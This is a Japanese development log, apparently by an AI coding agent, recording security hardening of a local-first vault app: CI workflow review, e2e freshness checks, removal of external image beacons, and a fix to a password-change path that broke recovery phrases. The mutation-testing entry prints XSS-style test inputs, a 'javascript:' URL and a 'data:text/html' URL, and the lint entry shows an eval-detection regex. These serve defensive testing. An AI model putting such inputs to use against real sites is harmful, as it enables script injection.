| R3-5 `plain:` フォールバックの可視化 | 利用者に見えているか | **そのファイルの権限はどうか** | ✅ `secrets.ts` は `mode: 0o600`。`atomicWrite` の既定も 0600 で、tmp 名は毎回一意 (`pid-時刻-乱数`) なので「既存ファイルには mode が効かない」罠 (`emotions.ts` に実測記録あり) に当たらない。控え `.prev` は `copyFile` 後に明示 `chmod` |
| R2-2 `customPath` | 4 つの書き出しは封じ込められているか | **同じ判断の 2 実装目 (`devEnv`) と食い違わないか** | ✅ 食い違うが**正しく食い違っている**。`devEnv` は読み側なので両側 realpath、`exportPaths` は書き側 (宛先が未作成なので realpath が原理的に当たらない) —— **両方に理由が書いてある** (0-a-14 の「揃えてはいけない 2 実装」) |

#### 併せて確かめた注記の主張

`devEnv.ts:297` は「現状 `readDevEnv()` は**引数なしでしか呼ばれず**」と
封じ込めの前提を書いている。この種の主張は腐るので数えた ——
製品コードの呼び出しは `linux.ts:176` の 1 件のみ・引数なし。**主張は今も正しい。**

#### この軸の見通し

`SECURITY_AUDIT.md` の完了項目で「隣の沈み先」を問える形のものは、
これで一巡した (R2-7 SW / R3-6 CSS url() / R2-13 script 埋め込みは
それぞれ別項に記録)。次は別の軸を立てること —— この軸をもう一度なぞっても
同じ白が出るだけになる。


---

### 週次 CI の書き戻しと、保管キーを選べるかを見た — 白 (2026-08-24)

**変更なしの回。** 別の軸を 2 つ立てた。

#### 軸 1: リポジトリ自身へ書き戻すワークフロー (`knowledge-auto.yml`)

週 1 回動き、派生物を再生成して Issue を立てる。供給網に効く経路なので見た。

- `permissions: contents: read / issues: write` —— **push しない**。最小権限
- 起動は `schedule` と `workflow_dispatch` のみ。`pull_request` が無いので
  **フォークからの実行経路が無い**
- `run:` に `${{ }}` の展開なし (同日追加した規則で機械的にも保証)
- `github-script` が組み立てる Issue 本文に入るのは**数値と生成日時だけ**。
  外部から来た文字列は 1 つも通らない

**「派生成果物ドリフトなしを検証」(`git diff --exit-code`) が空撃ちでないかを確かめた**
—— これは「検査対象が 0 件でも緑」の形になりやすい。実測: `knowledge-vault/` は
**7,543 ファイルが追跡下**にあり、再生成の対象になる。いっぽう
`orchestration/knowledge-queue.json` は `.gitignore` に在る ——
毎回変わる `generatedAt` を持つのでこれが追跡下だと**毎週必ず落ちる**。
**追跡と無視の割り当てが正しい。**

**外へ出る唯一の経路** (出典 URL の死活確認・週 400 件) も見た ——
`fetch(url, { method:'HEAD', redirect:'follow', signal })` で
**本文を一切読まず `res.status` だけ**を使う。中断シグナルつき。
記録先は gitignore された作業キューなので、仮に妙な先へリダイレクトされても
残るのは状態コードだけ。`execFileSync` は配列引数 (シェルを経由しない) で、
渡すのはコード上のリテラル。

#### 軸 2: 保管の**キー**を呼び出し側が選べるか

値の検証は同日に洗った (19 経路・白)。今度は**書き込み先の名前**を見た ——
キーを選べるなら、別機能の設定 (テーマ・接続先・プラン) を踏める。

`setItem` 18 件のうち、キーが定数でないのは 2 件だけで、どちらも白:

- `App.tsx` の `saveIds(key, …)` —— private ヘルパで、呼び出しは 4 か所すべて
  モジュール定数 (`RECENTS_KEY` / `FAVORITES_KEY`)。読み側も `isServiceId` で濾す
- `pkceSession.ts` の `storageKey(k)` —— `k` の型が
  `(typeof KEYS)[number]` (4 要素のタプル) なので**型で塞がっている**うえ、
  接頭辞つき

IndexedDB 側も `put` の鍵は `serviceId` / レコード id / 定数のいずれかで、
`store.ts:314` は更新時に `existing.collection` を引き継ぐので
**コレクションを跨いで書き換えることもできない**。

#### 所見 — この面は掘り尽くしつつある

直近 3 回のうち 2 回が変更なし。残っている最大の未解決は**コードの中に無い**
(公開済みリリースの棚卸し・Google Drive の共有設定・オリジンの分離)。
いずれも持ち主の判断が要る。


---

### 出荷する実物に個人データ検査を当てた (2026-08-24)

軸を静的な読みから**実測**へ移した。このセッションで一番重い発見は
「利用者の個人データが GitHub Pages で公開されていた」だったが、
その後に入れた `lint:sample-data` が見ているのは
`src` / `scripts` / `orchestration` で、**出荷される HTML そのものは
見ていなかった**。

#### まず実物を測った — 白だった

公開対象 6 件 (app / lite / landing / デモ 3 本) をビルドして、
**ゲート自身の `check()` を借りて**当てた:

```
  出荷成果物 6 件を検査 → ✅ 0 件
```

今のビルド構成ではバンドルは走査済みの 3 ディレクトリから作られるので
取りこぼしは無い。**が、それは構成が保証しているだけで、規則が
保証していることではない。**

#### 途中で 2 回まちがえた (どちらも報告前に潰した)

1. **自分の走査が誤検知した** —— `VENDOR_ID_SHAPES` を export から借りたが、
   同じ要素にある `skip` (Slack 自身のホスト) を写し忘れ、
   `https://api.slack.com` を個人ワークスペースとして 2 件挙げた。
   **正規表現だけ借りて除外を借りなかった** —— 写しを作ると比べているのが
   写しになる、の実演。`check()` ごと借りる形に直した。
2. **「カレンダー ID にゲートが無い」と思った** ——
   `VENDOR_ID_SHAPES` に Google カレンダーの形が無いのは事実。だが
   カレンダー ID はメール形なので**規則 2 (レンダラーのメールは example のみ)**
   に掛かり、実在する 2 件は `EMAIL_ALLOW` に理由つきで載っていた。
   実測して確かめた:

   | 入力 | 結果 |
   |---|---|
   | 台帳に無い個人カレンダー ID | ✅ 鳴る |
   | 祝日カレンダー (台帳) | ✅ 鳴らない |
   | 0 埋めの見本 (台帳) | ✅ 鳴らない |

   **穴ではなかったので、実装せずに済んだ。**

#### ゲートにした — `--artifact` モード

前例がある。`ci.yml` は inject-pwa を**実物**に当てている
(写しを見ていたせいで公開して初めて分かった事故が元)。同じ理由で
個人データ検査も実物に当てる。

- `lint-sample-data.cjs --artifact <file>…` を追加。規則は `check()` を借りる
- CI は既に `/tmp/inject-check/` へ app / index / lite を退避しているので、
  そこへ**デモ 3 本の退避を足した** —— デモは
  `build:web:lite` が `dist/` を空にする前に作られており、
  **誰にも見られないまま消えていた** (landing で同じ順序を読み違えて
  1 度 CI を落としている。同じ罠)
- 自己テスト 5 件。うち 1 件は「**渡したファイルが無ければ鳴る**」——
  ビルド忘れで 0 件になって緑、を塞ぐ
- 実測: 11MB の `standalone.html` に 169ms

対照として 5 種を実際に注入し、全部鳴ることを確認した
(Google ドキュメント / 個人カレンダー / Canva / 実在ドメインのメール /
Slack ワークスペース)。素の成果物は 0 件。

**CI と同じ順序をクリーンな `dist/` から通しで再現**して確かめている
(手元で個別にビルドすると順序の罠が再現しないため)。


---

### 自分が足したものを実機で確かめ、その検査を e2e に残した (2026-08-24)

`e2e` は **CI に入っていない**。にもかかわらず、直前に貸借対照表へ
入力欄を 4 つ足していた —— **誰も実機で見ていない状態**だった。

#### 実機で確かめた

Chromium で `dist/standalone.html` を開き、書類スタジオ →
計算書類（4点）まで進めて確認:

- 4 科目すべてが入力欄として出る
- 入れた額が貸借対照表の行に出る
- 資産・負債へ同額入れても貸借は崩れない
- **納付と還付を両建てすると検算が指摘する**
- ページエラー 0

#### 途中で 2 回まちがえた

1. **`data-doc-id="kessan"` を探して「タブが無い」と誤診した** ——
   `data-doc-id` は雛形書類 52 件の系統で、決算書は**別コレクション**
   (`data-collection="kessan"`)。実際に描画されている属性値を
   列挙して分かった
2. **自分の節だけ約束を破っていた** —— 他の 7 節はすべて
   自前の context を作って `setupVault` を呼ぶ。私の節は
   `browser.newPage()` で他の節の保管庫に相乗りしており、
   `SERVICE_HUB_E2E_ONLY=kessanTax` 単独では動かなかった。
   **`ONLY` は「本体を壊したらこの検査が落ちるか」を確かめるための
   仕組み**なので、単独で動かない節はその目的を果たせない

#### 検査として残した

`scripts/e2e/core.cjs` に `kessanTax` 節 (9 項目) を追加。

**対照実験も済ませた** —— `ACCOUNTS` から `仮払消費税等` を 1 行消して
ビルドし直すと、`kessan: 「仮払消費税等」の入力欄が在る` が名指しで落ちる。
復元して全 8 節が通ることも確認済み。

単体テストは `ACCOUNTS` の区分と区分合計を固定しているが、そこから
**「入力欄として画面に出るか」までは見ていない**。フォームは
`ACCOUNTS.map` で組み立てているので、その配線が切れたら
単体は通ったまま画面だけ空になる。そこを埋める節。


---

### 「壊したのに緑」を 2 回受け取った — e2e が古い成果物を黙って使っていた (2026-08-24)

クリックジャッキング拒否 (`frameGuard`) を実機で確かめ、e2e に節として
残そうとして**対照実験**をした。防御を外してビルドし直し、検査が落ちる
ことを見るはずだった。

**2 回とも「まだ効いています」という緑が返ってきた。**

#### 原因 — ビルドが失敗しても e2e は前回の HTML を使う

`npm run build:web` は `tsc -b && vite build && …` なので、型検査で
落ちると**成果物は作られないまま**その場で止まる。

- 1 回目: `if (isFramed())` → `if (false)` にしたら `isFramed` が未使用に
  なり `TS6133`
- 2 回目: `isFramed` の本体を `return false` にしたら引数 `w` が未使用で
  `TS6133`

どちらも `npm run build:web >/dev/null 2>&1` で握り潰していたため、
**古い (壊す前の) `dist/standalone.html` を相手に全項目が通った**。

`e2e` は対象ファイルの**存在**は確かめていたが、**新しさ**は見ていなかった。

#### なぜ重いか

「検査したつもり」がいちばん危ない。壊れていないことを確かめたのではなく、
**壊す前のものを見ていた**。しかも出力は完全に正常で、区別が付かない。

このリポジトリが繰り返し踏んでいる「写しを見ていた」と同じ形である
(`ci.yml` の inject-pwa 検証、CI の順序の罠、私自身の走査の誤検知)。
今回は**時間軸方向の写し**だった。

#### 直した

`scripts/e2e/core.cjs` に鮮度検査を追加。`src/` の最終更新時刻 (ただし
`__tests__` は束に入らないので除く) が成果物より新しければ **exit 2 で止める**。

```
E2E: 成果物が src/ より 62 秒古い (dist/standalone.html)。
     ビルドが失敗したまま古い HTML を検証しようとしています —
     そのまま流すと「壊したのに緑」を受け取ります。
```

意図して古い物を見たいときのために `SERVICE_HUB_E2E_ALLOW_STALE=1` を用意した
(注意書きを出して続行する)。3 通りとも実測済み — 古い→exit 2 /
古い+許可→続行 / 新しい→exit 0。

#### 対照実験のやり直し

`void w; return false;` でコンパイルを通してから壊すと、
**2 件が名指しで落ちた**:

- `frame: 拒否の見出しが出る` ❌
- `frame: 保管庫の画面も出さない` ❌

「サイドバーが無い」は**落ちなかった** —— 枠の中に出るのは初回設定画面で
サイドバーではないため。**この 1 件しか見ていなかったら対照は素通りしていた。**
拒否の文言と保管庫画面の両方を見ていたのが効いた。


#### 同じ罠を持つ道具を数えた — 3 つあった

鮮度を見ていなかったのは e2e だけではなかった。**成果物を相手にする道具**を
数えると 3 つある:

| 道具 | 見ていたもの | 危険 |
|---|---|---|
| `e2e` | 存在のみ | 古い HTML を検証して「壊したのに緑」 |
| `perf` | 存在のみ | 古いバンドルの起動性能を測って「問題なし」 |
| `smoke` | **何も見ていない** | 古い `dist/` を撮って「全ページ描画できた」 |

判定を 3 か所へ書き写すと、比べているのが写しになる。
`scripts/lib/artifact-freshness.cjs` に **1 つだけ**置き、3 つが借りる形にした。

3 つとも実測済み (新鮮 → exit 0 / 古い → exit 2):

```
  e2e   新鮮 exit=0 / 古い exit=2   dist/standalone.html (809 秒古い)
  perf  新鮮 exit=0 / 古い exit=2   standalone-lite.html + standalone.html
  smoke              古い exit=2   dist/index.html (810 秒古い)
```

検査 11 件 (`src/shared/__tests__/artifactFreshness.test.ts`)。うち効くのは
**`__tests__` を数えない** (検査だけ直したときに止めない) と
**束に入らない拡張子を数えない** (`.md` を触っても止めない) の 2 件 ——
誤検知で止まる道具は結局使われなくなるため、そこを固定する。


---

### 開いただけで第三者に信号が飛んでいた (2026-08-24)

Electron の smoke (72 ページ撮影) のログに **SSL ハンドシェイク失敗**が
1 行混ざっていた。**画面を撮るだけで外部通信が起きている**ということなので追った。

#### 実測した

同梱の見本データが参照する外部画像ホストを数えると 2 つ
(`design.canva.ai` ×6 / `avatars.githubusercontent.com` ×1、いずれも
`snapshot.ts`)。実際に飛ぶかをブラウザで数えた:

| 操作 | 外部通信 |
|---|---|
| 起動〜保管庫作成 | **0 件** (設計どおり local-first) |
| Canva のページを開く | **design.canva.ai へ 12 件** |
| GitHub のページを開く | **avatars.githubusercontent.com へ 2 件** |

**資格情報を 1 つも設定していない状態**で、ページを開くだけで
「この IP がこの時刻にこのアプリを開いた」が相手に渡っていた。

ID は見本化済みだったが**ホストは本物**なので、スクラブでは消えなかった
形である (`lint:sample-data` は ID の中身を見る規則で、
**ホストへ取りに行くこと自体**は対象外)。

見本の画像を取りに行く機能上の理由は無い。オフラインでは壊れるだけで、
アプリの「local-first」という性格とも噛み合わない。

#### 直した

7 件をインライン `data:image/svg+xml` の見本画像に置き換えた。
`safeImageSrc` は `data:image/*` を許可済みで、`<img>` 経由の SVG は
secure static mode なのでスクリプトは動かない。**通信そのものが起きない。**

再実測: 起動 0 件 / Canva 0 件 / GitHub 0 件。

#### ゲートにした — 字面ではなく挙動で

`e2e` に `noBeacon` 節 (6 項目)。**「何本出て行ったか」だけを数える。**

字面で禁じる規則 (`https://` を見本に書くな) にしなかったのは、経路が
`<img>` だけではないため —— CSS の `url()`・`fetch`・`<link>` でも同じことが
起きる。実際、同日に CSS `url()` の穴を別途塞いでいる。**挙動で見れば
経路によらず捕まる。**

対照実験済み — 1 件だけ外部 URL に戻すと
`beacon: canva を開いて外部通信 0 (実際 design.canva.ai:2)` と
**どこへ何本かまで名指しで**落ちる。


---

### 72 面を撮っていたが、エラーが出ていないかは誰も見ていなかった (2026-08-24)

`smoke` は全 74 サービス面を Electron で開いて撮る **唯一の道具** (e2e が
触るのは 10 面ほど)。だがこれまで見ていたのは

- 撮れたか
- 前ページの残像でないか (画像のバイト比較)

だけで、**ページが描画中に例外を投げても素通り**していた。撮影は成功し、
画像も別物になるので、区別が付かない。

#### エラー収集を足した

`console-message` と `render-process-gone` を拾い、**どのページで出たか**を
持たせた (件数だけでは直す手がかりにならない)。

**結果: 全 72 面で 0 件。** アプリは健全だった。

#### 「0 件」に意味を持たせる — 収集器の自己検査

Electron の `console-message` は版によって引数の形が違う (43 は詳細
オブジェクト、旧版は `(e, level, message)`)。取り違えても例外は出ず、
**黙って 0 件になる** —— つまり「エラー 0 件」が、健全なのか
収集できていないのか区別が付かなくなる。

そこで毎回、既知のエラーを 1 本出して**拾えたことを確かめてから**本番に入る。
拾えなければ `exit 2` で止める (0 件という報告を出さない)。

対照実験済み — `level` の判定を壊すと `exit 2` で止まり、
直すと `exit 0` に戻る。

#### 途中で自分の入れた欠陥を 1 つ捕まえた

報告は赤字で出るのに **終了コードが 0 のままだった**。
`process.exitCode = 1` を立てても **`app.quit()` はそれを見ない**
(Electron は何を入れても 0 で終わる)。呼び出し側は成功と受け取る。

同じファイルの catch 側は元から `app.exit(1)` を使っており、
**こちらだけ揃っていなかった**。`app.exit(code)` に直した。

3 通りとも実測:

```
  収集器が壊れている  → exit 2 (0 件という報告を出さない)
  エラーが出た        → exit 1
  正常               → exit 0
```


---

### 文書が「無い」と言って、動く仕組みを隠していた (2026-08-24)

自分が足した e2e 3 節 (`kessanTax` / `frameGuard` / `noBeacon`) が
CI で一度も走っていないことに気づき、「関門はあるが通す仕組みが無い」形かを
確かめた。**仕組みはあった。**

`.github/workflows/e2e.yml` は `e2e` / `e2e:lite` / `perf` を実行する。
既定では走らないが (Actions 分の節約)、**2 つの起動口**が用意されている:

1. Actions 画面からの `workflow_dispatch`
2. PR に **`run-e2e` ラベル**を付ける

ところが **CLAUDE.md はこの 3 つを「**not** in CI」と書いたまま**だった。

#### なぜ重いか

CLAUDE.md は Claude Code セッションへの**指示書**である。「CI には無い」と
書いてあれば、読んだ側は**そこで探すのをやめる**。実際この e2e 経路は
誰にも使われないまま残っていた —— 私自身、workflow を開くまで存在を知らなかった。

このリポジトリは逆向きの事故を既に踏んでいる (CLAUDE.md が
`lint:forbidden` の規則を宣言しているのに実装が無かった)。
**実装が説明より先を行く形も、同じくらい起きる。**

#### 直した + 機械で見るようにした

CLAUDE.md を実態に合わせ、**ラベルの名前まで書いた** (知らなければ使えない)。

`cross-doc-consistency.cjs` に `checkNotInCiClaims` を追加 ——
**「not in CI」と書いてあるものが、本当にどの workflow でも走っていないか**。
既存の `checkCiGateCoverage` (ゲートを足したのに CI へ繋ぎ忘れた) の
ちょうど裏返しになる。

対照実験済み — 直す前の記述に戻すと、実ファイルに対して 3 件が名指しで鳴る:

```
❌ fact "not-in-CI claims" — CLAUDE.md は "e2e" を「not in CI」と書いているが
   .github/workflows/e2e.yml が実行している — 「無い」と信じさせて動く仕組みを隠している
   (e2e:lite / perf も同様に 3 件)
```

自己テスト 5 件。うち効くのは **前方一致で誤爆しない**
(`e2e` の主張は `e2e:lite` の実行に当たらない) —— 既存の
`checkCiGateCoverage` が同じ罠で `lint:test` / `lint:test-coverage` を
取り違えた前例がある。

#### ラベルは付けていない

`run-e2e` を付ければ CI で回せるが、**Actions 分は持ち主の資源**であり、
このリポジトリは無料枠を明示的に節約する方針で書かれている。
3 節とも対照実験つきでローカル検証済みなので、**判断は持ち主に委ねる**。
マージ前に一度回すなら、PR に `run-e2e` を付けるだけでよい。


---

### 指示書の数値が腐っていた — 機械照合を CLAUDE.md へ広げた (2026-08-24)

「文書が実装より遅れる」を直した流れで、**CLAUDE.md の数値の主張**を全部測った。
`verify:arch` は `docs/ARCHITECTURE.md` の数だけを見ており、
**同じ種類の主張が別のファイルに在るというだけで腐り放題**だった。

| 主張 (CLAUDE.md) | 実測 | ずれ |
|---|---:|---|
| `~1460 tests` | **9,614** | 6.6 倍 |
| `~1130 notes` (vault) | **7,543** | 6.7 倍 |
| `innerHTML ほか 21 種` | **31 種** | |
| CI で `all 28 verify:all gates` | **30** | **同じファイルの 87 行は「30 ゲート」** |
| `10.7 MiB / 2.6 MiB` (2026-08-11) | 10.8 / 2.7 | 軽微 |

74 services / 30 ゲート は正しかった。

#### 直し方を数の性質で分けた

- **テスト数は CLAUDE.md から消した** —— 数を 2 か所に書けば必ず食い違う。
  唯一の出所 (`ARCHITECTURE.md` の表、厳密照合済み) を指すだけにした
- **変わりにくい数は厳密照合** —— 禁止パターン数・ゲート数。
  `verify:arch` の `METRICS` に `docFile` を持たせ、突き合わせ先を選べるようにした
- **増える一方の数は下限** —— vault は `7,500+ notes` と書き、`gte` で見る。
  厳密にすると知識を 1 件足すたびに doc を直すことになり、その churn が
  「直さずに数だけ古くなる」を招く

#### 数え方は 1 つに寄せた

`countStaticIts()` を切り出した。ARCHITECTURE.md の表と (かつての)
CLAUDE.md の両方が同じ関数を使う —— 数え方を写すと、片方だけ直したときに
**「どちらが正しいのか分からない 2 つの数」**になる。

#### 既存の自己検査が私の変更を捕まえた

`指標の記述を丸ごと消す` は「ARCHITECTURE.md を空にすれば全指標が落ちる」を
`METRICS.length` で見ていた。CLAUDE.md 由来の指標を足すと**それらは落ちない**
ので 11/15 になり、自己検査が鳴った。期待値を
「arch を出所とする指標の数」に直し、逆方向の検査
(`CLAUDE.md 由来の指標が 1 つも無くなっていないか`) も足した。

#### 限界 (正直に)

vault の `7,500+` を `1,130+` に書き換えても `gte` は通る。
**`+` 付きの主張なので floor が意味的に正しく**、防げるのは過大主張だけである。
過小主張 (実態より小さく書く) は捕まらない。


---

### 関門がコンポーネントの中に隠れていて、一度も測られていなかった (2026-08-24)

自分が今日足したものがこのリポジトリ自身の基準を満たしているかを確かめた。
変異検査の対象 (243 件) を見ると、**`safeImageSrc` / `safeCssUrl` だけが
外れていた。**

同種の壁はすべて `src/shared/` の単一目的モジュールとして載っている
(`externalUrlGate` / `httpLimits` / `safeFilename` / `controlChars`)。
これだけが `components/DataList.tsx` の中に置かれており、

- `mutate` に **`.tsx` が 1 件も無い** → 変異体が 1 つも作られない
- `MUST_MEASURE` (必ず測る壁の名簿) にも載りようがない

という状態だった。**関門がコンポーネントの中に隠れていたことが、
見落とされた原因そのもの**である。

(同じ形は `exportPaths.ts` と `frameGuard.ts` で既に踏んでいる。
名簿はそのために在る。)

#### 出して測ったら 80.00%・生存 5

`src/shared/imageUrlGate.ts` へ移し、`mutate` と `MUST_MEASURE` に載せて実測。
**5 件のうち 3 件は本物の抜けだった。**

| 生存した変異 | 何が漏れていたか |
|---|---|
| `/^https?:\/\//` → `/https?:\/\//` | **先頭の `^` を外しても検査が通る** |
| `/^data:image\/…/` → 同上 | 同じ |
| `[;,]` → `[^;,]` | `data:image/png` (終端なし) を弾く検査が無い |
| `.trim()` 削除 | 前後の空白を扱う検査が無い |
| `replace(…, '')` → 別文字列 | tab を**取り除いた値が返る**ことの検査が無い |

アンカーの 2 件は実測で確かめた:

```
  "javascript:alert(\"https://example.com\")"
     アンカーあり → undefined
     アンカー無し → そのまま通る
  "data:text/html,<img src=\"https://example.com\">"
     アンカー無し → そのまま通る
```

`<img src>` では実害が出ないが、**同じ値が `safeCssUrl` 経由で CSS へ流れる**
(同日に塞いだ経路)。関門の意味が消える。

#### 100.00% にした

検査を 5 件足して 25 変異体すべてを殺した (**80.00% → 100.00%**)。

途中で**自分の期待値が誤っていた**のを 1 件捕まえた ——
`data:image/pngX,AAAA` は弾くべきだと書いたが、`pngX` はサブタイプの綴りとして
正当なので通るのが正しい。**規則が正しく、期待が誤っていた**ので期待を直した。

#### 移動したら台帳が鳴った

`lint:forbidden` の `KNOWN_SUPPRESSIONS` は双方向 (台帳にあるのに効いていない
例外も鳴る) なので、関門を移した瞬間に
「台帳にあるのに効いていない例外が 1 件あります (要らない穴)」で落ちた。
指す先を移動先へ直した。**双方向の台帳はこう効く。**


---

### パスワードを変えると、控えた 24 語が使えなくなっていた (2026-08-24)

軸を**失敗経路**に移した ——「守りは正常系では効いているが、
保管領域が使えないときに fail-open していないか」。`setToken` は
失敗を握り潰さず、呼び出し 7 か所すべてが画面に出していた (白)。

ところが**パスワード変更の経路**で手が止まった。

#### 何が書いてあったか

`SettingsPage.changePassword` は保管庫の内部を画面側で組み立てていた:

```
  1. 旧パスワードで解錠して全トークンを平文で読む
  2. indexedDB.deleteDatabase('business-hub-vault')   ← 保管庫ごと消す
  3. initialize(newPw)
  4. ループで書き戻す
```

2 が要るのは `initialize()` が既存 meta を見て throw し、かつ
**新しいマスター鍵を生成する**ため。つまりこの順序は設計上避けられず、
**失窓は構造的**だった。

#### 結果は 2 つ。重いのは 2 つ目

**(A) 消してから書き戻すまでが失窓。** その間、資格情報の唯一の複製は
メモリ上の平文だけ。中断 (書き込み失敗・自動施錠・タブを閉じる・再読込・
クラッシュ) で、まだ書き戻していない分は永久に失われる。実証済み ——
中断すると全消失、途中で失敗するとそこから先が消失。

**(B) 控えた 24 語が通らなくなる。** `initialize()` は新しいフレーズを
生成して**返す**が、画面はその戻り値を捨てていた。実測:

```
  変更後、利用者が控えたフレーズで recoverWithMnemonic → 失敗
  通るフレーズは initialize() の戻り値の中にしか無く、誰も見ていない
```

つまり**パスワードを変更するたびに、パスワードを忘れたときの唯一の綱が
静かに切れていた**。しかもインターフェースの注記は
「mnemonic は `initialize()` のものが永続」「`rotateRecoveryKey` は常に throw」
と書いており、**画面の実装がその不変条件を破っていた**。

#### 直し方は既にそこに在った

`recoverWithMnemonic` の注記を読むと:

> Validate mnemonic, unwrap master key, re-initialize under newPassword.
> **Preserves all stored tokens.**

**保管庫は正しい再鍵化を最初から持っていた** —— 認証手段がフレーズなだけ。
トークンは**マスター鍵**で暗号化されており、パスワードはそのマスター鍵を
包んでいるだけなので、パスワード変更は**包み直すだけ**でよい。

`vault.changePassword(oldPw, newPw)` を追加し、画面はそれを呼ぶだけにした。
トークンにもリカバリー枝にも触らないので、控えた 24 語は生き続ける。

#### ついでに見つけた潜在的な穴

`recoverWithMnemonic` は meta と `master-wrap` を **`idbPut` 2 回**で書いていた
= トランザクションが 2 つ。2 回目が失敗すると
**`kcv` は新パスワードを指し、`master-wrap` は旧パスワードで包まれたまま**の
保管庫が残る —— **新旧どちらのパスワードでも開けない**。

IndexedDB のトランザクションは同一 DB 内の複数ストアに対して原子的なので、
`idbPutAll` を足して 1 トランザクションにまとめた。新しい `changePassword` も
同じヘルパを使う (レガシー保管庫ではトークンの読み替えも同じ 1 つに入れる)。

#### 検証 9 件

控えた 24 語が変更後も通る / **2 回続けて変更しても最初のフレーズで復旧できる** /
トークンが 1 件も失われない / 新パスワードで開き旧で開かない /
**現在のパスワードが違えば何も変えずに落ちる** / 長さは保管庫の規則で弾く /
未初期化なら落ちる。

**対照を 1 件残した** —— 以前の手順 (消してから作り直す) を再現すると
控えたフレーズが通らなくなることを固定してある。回帰したらここで気付く。


#### 発生源の形をゲートにした

パスワード変更の穴を直した後、**同じ形が他に無いか**を掃いた。
画面 (`components/` / `pages/`) が保管領域の内部を触っている箇所は **0 件**
—— 直した 1 件が最後だった。

そこで形そのものを止めた。`lint:forbidden` に 32 個目の規則:
**`indexedDB.` / `.transaction(` / `objectStore(` を書いてよいファイルを台帳で固定する。**

今日見つけた 3 件の発生源は全部同じ形をしている:

| 見つかったもの | 何がどこに書かれていたか |
|---|---|
| パスワード変更の失窓 + フレーズ喪失 | **画面**が保管庫の消去と再作成を組み立てていた |
| 関門が変異検査から外れていた | **コンポーネント**の中に URL の関門が居た |
| CSS `url()` のスキーム素通り | **描画箇所**に検証を書いていた |

共通するのは「**その層の仕事でないものが、その層に書かれていた**」こと。

台帳は 8 件 —— 保管層のモジュール 5 つ (`vault` / `store` / `proxy` /
`library` / `fsa`) と、**外から**保管領域を覗いて検証する道具 3 つ
(暗号化されているかを実物で確かめる側なので、禁じると検証手段のほうが消える)。

対照実験済み — 直す前の 1 行を戻すと
`src/renderer/pages/SettingsPage.tsx:340` と**名指しで**落ちる。
自己テスト 6 件 (直接操作の 3 形は鳴る / 散文の "transaction" は鳴らない /
ストア・保管庫の API 越しは鳴らない)。

**この規則の追加を、同日に足した CLAUDE.md の指標が捕まえた** ——
禁止パターン数 31 → 32 のずれで `verify:arch` が落ちた。名簿が名簿を守っている。


#### 自分が書いたコードを疑って、2 つ見つけた

パスワード変更を直した後、**その直し自体**を点検した。

**(1) `idbPutAll` に空配列を渡すと投げる。** `db.transaction([], …)` は仕様上
`InvalidAccessError` になる (実測で確認)。今日の呼び出しは空を渡さないが、
2 つのセキュリティ経路が共有するヘルパで「書くものが無い」を例外にすると
後から使う人が踏む。無害な no-op に倒した。

**(2) レガシー経路が AAD を無条件に要求していた。** `getToken` は
記録の版で分けている (版つき = AAD あり / 版なし = AAD 導入前) のに、
私の書いたレガシー再暗号化は無条件で AAD つきの復号を要求していた。
**Phase E 以前の保管庫は AAD 以前より更に古いので必ず版なし**である。
つまり **レガシー利用者はパスワードを一切変更できない**状態を作っていた。
`getToken` と同じ判定に揃えた。

#### 対照が 2 回空振りした

(2) の検査を書くのに 3 度かかった。

1. レガシー保管庫を作って `setToken` → **`setToken` は常に AAD つきで書く**
   ので版なしの枝を通らない。対照が鳴らない
2. AAD 以前の記録を直接書き込む助数関数を足した → それでも鳴らない。
   原因は検査の中で `getToken` を呼んでいたこと ——
   **`getToken` は版の無い記録をその場で AAD へ束ね直す**ので、
   `changePassword` に届く前に旧形式が消えていた
3. その呼び出しを外して、ようやく対照が鳴った

「鳴らなかった」をまず**プローブの不具合**として疑う (0-a-15) が、
ここでは 2 回続けてプローブ側だった。


#### 「通信が起きない」だけでは足りなかった

見本画像を `data:` に差し替えた後、**絵として描けているか**は誰も見ていなかった。
`noBeacon` は通信の本数しか数えないので、**SVG の符号化を壊しても通ってしまう**
—— 画面には壊れた画像が出るのに緑になる。

描画確認を同じ節へ足した (`naturalWidth`/`naturalHeight`/`complete`)。

対照が決定的だった。SVG の閉じタグを削ってビルドし直すと:

```
  ✅ beacon: canva を開いて外部通信 0 (実際 0 件)      ← 通信検査は通ったまま
  ❌ beacon: canva の data: 画像が描けている (6 件中 壊れ 6)
```

**通信検査では捕まえられないものを捕まえる**ことが示せた。

#### 自分のプローブが 3 度目に間違えた

最初の実測で「7 件すべて描画できていない」と出た。**プローブの誤り**である ——
写した先の名前が `w`/`h` なのに判定で `i.naturalWidth` を読んでおり、
`undefined > 0` が常に false になっていた。出力に併記した
`w:320 h:180 complete:true` を読めば、実際には描けていると分かる。

今日、対照やプローブが空振りしたのはこれで **5 回目**
(ビルド失敗 2 回・`setToken` の AAD・`getToken` の束ね直し・この名前違い)。
**「鳴らなかった」も「全部鳴った」も、まず測り手を疑う。**


#### ついでにゲートの誤爆を 1 つ直した

描画確認に Playwright の `page.$$eval(...)` を使ったら、禁止パターンの
`eval(` が鳴った。`$` は非単語文字なので `\beval\s*\(` の `\b` が成立してしまう。
**JS の `eval` ではない**ので誤爆である。

直前の `$` を除外する形にした (`(?<!\$)\beval\s*\(`)。
`eval(` / `;eval(` / `window.eval(` は今も当たる。自己テスト 4 件で両方向を固定。

精度の低いゲートは鳴らし続けて無視されるのが最悪の結末なので、
**誤爆を見つけたらその場で直す**。

